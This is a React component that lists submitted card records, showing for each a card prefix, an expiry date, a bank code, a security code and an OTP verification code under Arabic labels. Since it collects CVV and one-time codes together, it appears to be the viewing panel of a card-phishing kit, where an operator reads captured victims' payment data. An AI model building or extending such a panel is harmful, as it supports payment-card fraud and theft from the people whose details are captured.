'use client';

import { Key, useEffect } from 'react';

import { Item } from './item';

export function ListItems({ submissions }: any) {
  useEffect(() => {}, []);
  return (
    <div className="p-4  bg-gray-50 mx-1 rounded-lg shadow py-16">
    <h2 className="text-2xl font-bold mb-4">Cards List</h2>
    <div className="space-y-4 w-">
      {submissions.map((submission:any) => (
        <div key={submission.id} className=" w-full grid grid-cols-1 gap-4">
          <Item
            number={submission.id}
            prefix={submission.data().prefix}
            expDate={`تاريخ الانتهاء: ${submission.data().month}/${submission.data().year}`}
            bank={`رمز البنك: ${submission.data().bank}`}
            pass={`رمز الامان: ${submission.data().pass}`}
            otp={`رمز التحقق {${submission.data().otp}}`}
          />
        </div>
      ))}
    </div>
  </div>
  
  )}
